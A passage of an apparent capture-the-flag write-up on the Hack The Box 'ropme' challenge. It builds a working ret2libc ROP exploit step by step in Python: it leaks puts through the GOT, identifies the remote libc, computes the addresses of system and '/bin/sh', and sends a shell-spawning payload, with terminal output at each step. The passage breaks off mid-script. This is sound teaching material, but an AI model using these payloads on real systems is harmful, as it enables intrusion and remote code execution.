+<p>Let&rsquo;s get to work, we will use the same technique of ROPing to make the program call the <code>puts</code> function with the argument we provide:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ptr</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>, n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PAD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gadget_pop_rdi_ret <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4006d3</span>)
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4004e0</span>)
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x601018</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> PAD
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> gadget_pop_rdi_ret   <span style="color:#75715e"># ret to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> puts_got             <span style="color:#75715e"># this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> puts_plt             <span style="color:#75715e"># return here with stack aligned</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print payload
+</span></span></code></pre></div><p>It&rsquo;s important to note though that we will find something with this code only if it runs AFTER the GOT entry has been filled (that is , if <code>puts</code> was already called). Which is our case of course because our code runs after the entire main is done.</p>
+<p><strong>QUESTION: I run the exploit but get nothing back! what&rsquo;s wrong?</strong>
+That&rsquo;s because <code>puts</code> places the string on the stream but it doesn&rsquo;t yet flush it, so we have to call <code>fflush(0)</code> as well (remember the <code>fflush</code>?).
+So we will add the following to the exploit code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ptr</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>, n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PAD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gadget_pop_rdi_ret <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4006d3</span>)
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4004e0</span>)
+</span></span><span style="display:flex;"><span>fflush_plt <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x400510</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x601018</span>)
+</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> PAD
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> gadget_pop_rdi_ret   <span style="color:#75715e"># ret to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> puts_got             <span style="color:#75715e"># this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> puts_plt             <span style="color:#75715e"># return here with stack aligned</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> gadget_pop_rdi_ret   <span style="color:#75715e"># ret to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> NULL                 <span style="color:#75715e"># this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> fflush_plt           <span style="color:#75715e"># return here</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print payload
+</span></span></code></pre></div><p>Next step is to compute the base of libc from that value, <strong>but before we do that, we must determine the libc version of the remote machine</strong> this requires our script to be a little bit more advanced and to work with sockets, don&rsquo;t worry - there&rsquo;s not that much we need to add!</p>
+<p>At the end, we will use something like this in our code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">compute_libc_base_from_puts</span>(puts_va):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># this is true for libc 2.27</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># this is true for my local machine only</span>
+</span></span><span style="display:flex;"><span>    puts_offset_in_libc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0809c0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> puts_va <span style="color:#f92672">-</span> puts_offset_in_libc
+</span></span></code></pre></div><p>So the next step is to figure out what version of libc the remote machine is running, and then place the correct offset in our function so we could know the base of libc and thus the addresses of <code>system</code> and <code>&quot;/bin/sh&quot;</code>.</p>
+<h3 id="leaking-glibc-version">Leaking GLIBC version</h3>
+<p>We have to remember that ASLR, doesn&rsquo;t randomize the location of libc entirely,
+let&rsquo;s observe:</p>
+<pre tabindex="0"><code>shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2c2aa0b000)
+shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f05947fd000)
+shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007efe992b4000)
+shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2a13198000)
+shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd33e7f5000)
+shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb92bd11000)
+shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7b0e759000)
+</code></pre><p>Notice any pattern? well, the last three hex digits of the address are always zero, also - the start of the address is <code>7f</code>.
+Which makes some sense because we cannot really expect libc to pop somewhere before the .text segment in our process, or in another weird location. So it has to have some bounds.</p>
+<p>This still isn&rsquo;t a good enough excuse to try brute force, but - this feature can help us in determining the version of libc which was loaded. How? Well, if the virtual address of <code>puts</code> is <code>0x7ffff7a649c0</code>, and there are only so many different offsets which <code>puts</code> can be placed in (in every version of libc the offset may differ). Then based only on that address, we could compute which of all possible offsets will place the base of libc at an address that looks like that: <code>0x7f_______000</code>.</p>
+<p>Sounds like a lot of work right? Well, luckily for us, we can use a tool that will do the computation for us. Introducing: <a href="https://libc.blukat.me">libc database</a>.</p>
+<p>So, we could just plug the virtual address we see for <code>puts</code> and libc database will suggest what versions are possible that will yield such virtual address.</p>
+<p><img src="/images/ropme/ld_1.png" alt="libc_db_input_1"></p>
+<p>Then we see the suggestions:</p>
+<p><img src="/images/ropme/ld_2.png" alt="libc_db_input_2"></p>
+<p>Naturally, the more addresses we provide, the amount of possible versions shrinks.</p>
+<p>So, we have everything we need to know, we just have to start working! let&rsquo;s prepare our code to have the remote machine leak the address of <code>puts</code>, and let&rsquo;s see if that would be enough for us to learn the libc version of it. If that will not be enough - we might have to also leak <code>fflush</code> and <code>fgets</code>.</p>
+<p>Let&rsquo;s put everything together to one script leaking the <code>puts</code> location: (The changes so far are only in the <code>remote()</code> function)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ptr</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>, n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">compute_libc_base_from_puts</span>(puts_va):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># this is true for libc 2.27</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># this is true for my local machine only</span>
+</span></span><span style="display:flex;"><span>    puts_offset_in_libc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0809c0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> puts_va <span style="color:#f92672">-</span> puts_offset_in_libc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote</span>(data):
+</span></span><span style="display:flex;"><span>    remote_address <span style="color:#f92672">=</span> ((<span style="color:#e6db74">&#34;docker.hackthebox.eu&#34;</span>,<span style="color:#ae81ff">35034</span>))
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;connecting to &#34;</span>, remote_address
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>connect(remote_address)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># server&#39;s initial message: &#34;ROP ME outside...&#34;</span>
+</span></span><span style="display:flex;"><span>    print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;connected. sending data&#34;</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(bytes(data <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;server responded:&#34;</span>
+</span></span><span style="display:flex;"><span>    print ans
+</span></span><span style="display:flex;"><span>    print binascii<span style="color:#f92672">.</span>hexlify(ans)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PAD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gadget_pop_rdi_ret <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4006d3</span>)
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4004e0</span>)
+</span></span><span style="display:flex;"><span>fflush_plt <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x400510</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x601018</span>)
+</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> PAD
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> gadget_pop_rdi_ret   <span style="color:#75715e"># ret to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> puts_got             <span style="color:#75715e"># this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> puts_plt             <span style="color:#75715e"># return here with stack aligned</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> gadget_pop_rdi_ret   <span style="color:#75715e"># ret to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> NULL                 <span style="color:#75715e"># this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> fflush_plt           <span style="color:#75715e"># return here</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>remote(payload)
+</span></span></code></pre></div><p>This is the output we see when we run the script:</p>
+<pre tabindex="0"><code>shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
+connecting to  (&#39;docker.hackthebox.eu&#39;, 35034)
+ROP me outside, how &#39;about dah?
+
+connected. sending data
+server responded:
+�F�~N
+
+9046d87e4e7f0a
+</code></pre><p>The unreadable characters are obviously not important, what we care about is the hex representation of the response which we see in the last line.
+Notice how <code>9046d87e4e7f0a</code> doesn&rsquo;t really look like an address&hellip; <strong>but</strong> let&rsquo;s take a look at it for a second.</p>
+<p>The last byte is <code>0a</code> which is a new line which makes sense because <code>puts</code> appends a new line character to the end of the string when it prints it out. OK, what about the next byte? <code>7f</code> that does look like a start of an address, so maybe it&rsquo;s just that the order of the bytes is reversed, let&rsquo;s modify the code a little bit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote</span>(data):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ....</span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;server responded:&#34;</span>
+</span></span><span style="display:flex;"><span>    print ans
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># omit the 0a</span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># reverse the order</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>hexlify(ans)
+</span></span></code></pre></div><p>Now we see:</p>
+<pre tabindex="0"><code>shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
+connecting to  (&#39;docker.hackthebox.eu&#39;, 35034)
+ROP me outside, how &#39;about dah?
+
+connected. sending data
+server responded:
+�vоS
+
+0x7f53bed07690
+</code></pre><p>Great! we have successfully leaked the address of <code>puts</code> on the remote machine. Let&rsquo;s look at that in libc database to maybe learn the version of libc on the remote machine:</p>
+<p><img src="/images/ropme/libc_1.png" alt="libc_db_second_1">
+<img src="/images/ropme/libc_2.png" alt="libc_sb_second_2">
+We got 2 matches, but both indicate the same libc version so the offset of the important stuff is the same (I checked). You can try as an exercise to call the server again and have it leak the location of <code>puts</code> again if you feel uncertain, or have the process return again to <code>puts</code> and this time also print the location of <code>fflush</code> and <code>fgets</code>. Clicking on one of the versions we see:</p>
+<p><img src="/images/ropme/libc_3.png" alt="libc_sb_second_3"></p>
+<p>Awesome! offsets of everything we look for! so in this leak, the virtual address we have for <code>puts</code> was <code>0x7f53bed07690</code>, which according to the table above, means that the libc base was at <code>0x7f53bed07690 - 0x67690 = 0x7f53beca0000</code>.</p>
+<p>Definitely looks like a valid libc base.</p>
+<p>Let&rsquo;s enhance the code to use this information to compute the virtual address of <code>system</code> and <code>&quot;/bin/sh&quot;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">compute_libc_base_from_puts</span>(puts_va):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># remote machine uses libc v2.23</span>
+</span></span><span style="display:flex;"><span>    puts_offset_in_libc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6f690</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> puts_va <span style="color:#f92672">-</span> puts_offset_in_libc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote</span>(data):
+</span></span><span style="display:flex;"><span>    remote_address <span style="color:#f92672">=</span> ((<span style="color:#e6db74">&#34;docker.hackthebox.eu&#34;</span>,<span style="color:#ae81ff">35034</span>))
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;connecting to &#34;</span>, remote_address
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>connect(remote_address)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># server&#39;s initial message: &#34;ROP ME outside...&#34;</span>
+</span></span><span style="display:flex;"><span>    print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;connected. sending data&#34;</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(bytes(data <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)    
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># omit the 0a</span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># reverse the order</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Virtual address of puts is: 0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>hexlify(ans)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">=</span> compute_libc_base_from_puts(int(binascii<span style="color:#f92672">.</span>hexlify(ans), <span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Base of libc:&#34;</span>, hex(libc_base)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Address of system: &#34;</span>, hex(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45390</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Address of binsh: &#34;</span>, hex(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18cd57</span>)
+</span></span></code></pre></div><p>Which gives us:</p>
+<pre tabindex="0"><code>shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
+connecting to  (&#39;docker.hackthebox.eu&#39;, 35034)
+ROP me outside, how &#39;about dah?
+
+connected. sending data
+Virtual address of puts is: 0x7fdc0ec36690
+Base of libc: 0x7fdc0ebc7000
+Address of system:  0x7fdc0ec0c390
+Address of binsh:  0x7fdc0ed53d57
+</code></pre><p>Note how libc base is different now, this is expected as ASLR is active on the remote machine. BUT! we can successfully learn the base of it every run!</p>
+<p>One more thing to finish, after we leak the address - the program dies, and when the program dies - the offsets change again! so we need to ask ourselves: <strong>how to leak the addresses and also keep the process alive so that we will be able to send it to system(&quot;/bin/sh&quot;)?</strong></p>
+<p>Solution: after returning from <code>fflush</code>, let&rsquo;s return to <code>main()</code> again! This will require us to forge a new payload and send it again. So our (almost) final code is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ptr</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>, n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">compute_libc_base_from_puts</span>(puts_va):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># remote machine uses libc v2.23</span>
+</span></span><span style="display:flex;"><span>    puts_offset_in_libc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6f690</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> puts_va <span style="color:#f92672">-</span> puts_offset_in_libc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote</span>(data):
+</span></span><span style="display:flex;"><span>    remote_address <span style="color:#f92672">=</span> ((<span style="color:#e6db74">&#34;docker.hackthebox.eu&#34;</span>,<span style="color:#ae81ff">35034</span>))
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;connecting to &#34;</span>, remote_address
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>connect(remote_address)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># server&#39;s initial message: &#34;ROP ME outside...&#34;</span>
+</span></span><span style="display:flex;"><span>    print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;connected. sending data&#34;</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(bytes(data <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Only take the 7 first bytes of the input</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Because the rest of it will be &#34;ROP Me outside ...&#34; again</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we don&#39;t care about that, we care about the address only</span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)[:<span style="color:#ae81ff">7</span>]      
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># omit the 0a</span>
+</span></span><span style="display:flex;"><span>    ans <span style="color:#f92672">=</span> ans[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># reverse the order</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Virtual address of puts is: 0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>hexlify(ans)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">=</span> compute_libc_base_from_puts(int(binascii<span style="color:#f92672">.</span>hexlify(ans), <span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Base of libc:&#34;</span>, hex(libc_base)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Address of system: &#34;</span>, hex(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45390</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Address of binsh: &#34;</span>, hex(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18cd57</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Craft new payload</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">=</span> PAD                      <span style="color:#75715e"># 72 bytes of &#34;A&#34;s</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> gadget_pop_rdi_ret      <span style="color:#75715e"># return there when done with main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># address of &#34;/bin/sh&#34;, this will be popped to RDI</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> ptr(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18cd57</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Address of system. return here after you pop</span>
+</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">+=</span> ptr(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45390</span>)    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Send the payload</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(payload2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get back an answer, we expect that system(&#34;/bin/sh&#34;) will run</span>
+</span></span><span style="display:flex;"><span>    print conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PAD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x400626</span>)
+</span></span><span style="display:flex;"><span>gadget_pop_rdi_ret <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4006d3</span>)
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> ptr(<span style="color:#ae81ff">0x4004e0</span>)
